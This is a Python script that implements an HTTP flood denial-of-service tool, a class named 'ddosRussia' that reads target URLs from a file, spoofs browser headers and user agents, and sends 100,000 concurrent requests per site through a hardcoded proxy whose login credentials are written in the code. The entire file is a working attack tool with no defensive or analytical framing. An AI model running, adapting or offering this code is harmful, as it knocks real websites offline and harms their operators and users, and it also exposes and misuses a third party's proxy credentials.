import asyncio
import time
from aiohttp import ClientSession
from fake_useragent import UserAgent
import threading

class ddosRussia:
    def __init__(self, url, proxy):
        self.url = url
        self.proxy = proxy
        self.headers = {
            'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="96", "Chromium";v="97"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': UserAgent().firefox,
            'Referer': self.url,
        }

    async def fetch_url_data(self, session):
        try:
            async with session.get(self.url, timeout=10, proxy=self.proxy) as response:
                resp = await response.read()
                # print(resp)

                return response.ok
        except Exception as e:
            print(e)
        return
    
    async def fetch_async(self, ntimes):
        tasks = []
        async with ClientSession(headers=self.headers) as session:
            for i in range(ntimes):
                task = asyncio.ensure_future(self.fetch_url_data(session))
                tasks.append(task)
            responses = await asyncio.gather(*tasks)
        return responses

def make_list_from_file(file):
  with open(file, 'r') as f:
    return [x for x in f.read().split("\n") if x]

def take_urls(file = 'scam.txt'):
  urls = make_list_from_file(file)
  return urls

def ddos_new_site(url, proxy):
    ddos_site = ddosRussia(url, proxy)
    ntimes = 100
    for i in range(1000):
        start_time = time.time()
        resp = asyncio.run(ddos_site.fetch_async(ntimes))
        print(f'Valid requests: {resp.count(True)}/{len(resp)} for site: {url} during {time.time() - start_time} seconds')
        
if __name__ == '__main__':
    # asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    urls = take_urls()
    proxy = 'http://oHXOMY:uIJ0LLa6Ai@212.115.49.92:5500'

    for url in urls:
        x = threading.Thread(target=ddos_new_site, args = (url, proxy))
        x.start()
